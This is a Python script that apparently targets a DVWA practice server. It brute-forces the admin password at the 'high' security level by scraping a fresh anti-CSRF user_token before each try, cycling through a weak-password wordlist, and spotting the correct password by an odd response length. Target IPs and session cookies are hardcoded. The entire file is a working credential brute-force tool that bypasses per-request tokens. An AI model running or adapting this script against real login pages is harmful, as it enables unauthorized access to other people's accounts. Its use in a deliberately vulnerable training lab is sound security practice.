#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from bs4 import BeautifulSoup
import requests

host = "172.105.194.56"
php_session_id = "suo8a94n6jrd5thpk1qu9o63h2"

# host = "45.63.107.103"
# php_session_id = "7h8t6sbk3gejnvj00cdk6kcli4"

security = "high"
# security = "impossible"

header_index = {'Host': f'{host}',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'
                              ' Ubuntu Chromium/77.0.3865.90 Chrome/77.0.3865.90 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;'
                          'q=0.8,application/signed-exchange;v=b3',
                'Referer': f'http://{host}/vulnerabilities/brute/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
                'Cookie': f'PHPSESSID={php_session_id}; security={security}'}

header_test = {'Host': f'{host}',
               'Cache-Control': 'max-age=0',
               'Upgrade-Insecure-Requests': '1',
               'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'
                             ' Ubuntu Chromium/77.0.3865.90 Chrome/77.0.3865.90 Safari/537.36',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;'
                         'q=0.8,application/signed-exchange;v=b3',
               'Referer': f'http://{host}/vulnerabilities/brute/index.php',
               'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
               'Cookie': f'PHPSESSID={php_session_id}; security={security}'}

url = f"http://{host}/vulnerabilities/brute/"


def get_token(req_url, headers):
    response = requests.get(req_url, headers=headers)
    # print(response.status_code)
    the_page = response.content.decode("utf-8")
    # print(len(the_page))
    # print(the_page)
    soup = BeautifulSoup(the_page, "html.parser")
    # div0 = soup.find("div", id="content")
    div0 = soup.find("div", "vulnerable_code_area")
    # print(div0)
    inputs0 = div0.form.find_all("input")
    input0 = inputs0[-1]
    # print(input0)
    token = input0["value"]  # get the user_token
    return token


def dict_generator(dict_path):
    """
    读取字典的生成器，在字典数量很大的情况下，使用生成器能够减少内存占用。
    :param dict_path: 字典文件的路径
    :return: 每调用一次 next() 返回一个字典中的子域名
    """
    with open(dict_path, "r") as f:
        while True:
            name = f.readline().strip()
            if not name:
                raise StopIteration
            yield name


def send_test_request(test_url, headers):
    res = requests.get(test_url, headers=headers)
    print(res.status_code)
    the_page = res.content.decode("utf-8")
    # print(the_page)

    return len(the_page)


def find_the_right_answer(test_list):
    test_set = set(test_list)
    if len(test_set) == 1:
        return None

    set_count = [test_list.count(i) for i in test_set]
    if set_count.count(1) == 1:
        print("Get the maybe right key.")
        return [i for i in test_set if test_list.count(i) == 1][0]
    else:
        return None


if __name__ == "__main__":
    key_generator = dict_generator("weak_password.dict")
    need_repeat = 5
    maybe_answer = None
    ans_list = []

    try_url = url + "index.php?username=admin&password={}&Login=Login&user_token={}"

    while True:
        user_token = get_token(url, header_index)
        print(f"Token: {user_token}")
        try:
            new_key = next(key_generator)
            print(f"Testing: {new_key}")
        except RuntimeError as e:
            print("All keys in dict have been tested.")
            break
        else:
            new_test_url = try_url.format(new_key, user_token)
            len_res = send_test_request(new_test_url, header_test)
            print(len_res)
            ans_list.append(len_res)
            if len(ans_list) > 100:
                ans_list.pop(0)

            new_answer = find_the_right_answer(ans_list)
            if new_answer is not None:
                maybe_answer = new_key
                print("Find the right answer!")
                break

    print(f"\n\nFind the key: {maybe_answer}")
